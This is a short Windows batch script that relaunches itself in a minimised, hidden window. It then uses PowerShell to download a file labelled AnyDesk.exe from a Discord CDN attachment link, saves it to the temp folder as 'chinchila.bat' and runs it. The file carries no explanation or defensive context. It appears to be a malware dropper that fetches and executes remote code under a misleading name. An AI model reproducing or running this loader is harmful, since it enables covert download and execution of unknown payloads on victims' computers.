@echo off
if "%1" == "hidden" goto :run
start /min cmd /c "%~f0" hidden & exit
:run
powershell.exe -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1328831724762697879/1335488745780023367/AnyDesk.exe?ex=67a05a51&is=679f08d1&hm=61f1be0ea841bd713791f6a0a4968120b7cf823e4093ddaf46a943d0747b2596&' -OutFile \"%TEMP%\chinchila.bat\"; Start-Process \"%TEMP%\chinchila.bat\""
